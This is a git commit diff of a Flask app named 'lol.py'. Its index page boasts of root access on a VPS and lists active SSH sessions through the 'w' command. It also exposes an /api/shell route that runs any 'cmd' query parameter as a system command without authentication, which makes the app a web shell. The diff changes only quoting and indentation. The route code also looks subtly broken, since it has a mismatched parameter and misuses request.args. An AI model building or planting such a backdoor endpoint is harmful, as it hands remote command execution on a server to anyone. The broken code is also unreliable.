55d061e67ee9e85578b0f041adbb06f8b6c08441
Elliot Alderson <60684641+0x0elliot@users.noreply.github.com>
2021-01-19 01:29:16 +0530

    Add files via upload

--- lol.py
+++ lol.py
@@ -5,15 +5,15 @@ app=Flask(__name__)
 
 @app.route('/')
 def lol():
-  return f"<p>i love the initiative but me having root access to any system, even if it's a VPS is funny. Probably was intended but still come on security professionals.<br>Active SSH connections<br></p><center>{subprocess.check_output(["w"])}</center>"
+  return f"<p>i love the initiative but me having root access to any system, even if it's a VPS is funny. Probably was intended but still come on security professionals.<br>Active SSH connections<br></p><center>{subprocess.check_output(['w'])}</center>"
   
 @app.route('/api/shell/<command>')
 def shell():
-  try:
-    request.args.cmd
-    return f"{subprocess.check_output(request.args.get('cmd').split())}"
-   except:
-    return "use cmd parameter to execute commands"
+    try:
+        request.args.cmd
+        return f"{subprocess.check_output(request.args.get('cmd').split())}"
+    except:
+        return "use cmd parameter to execute commands"
 
 
 
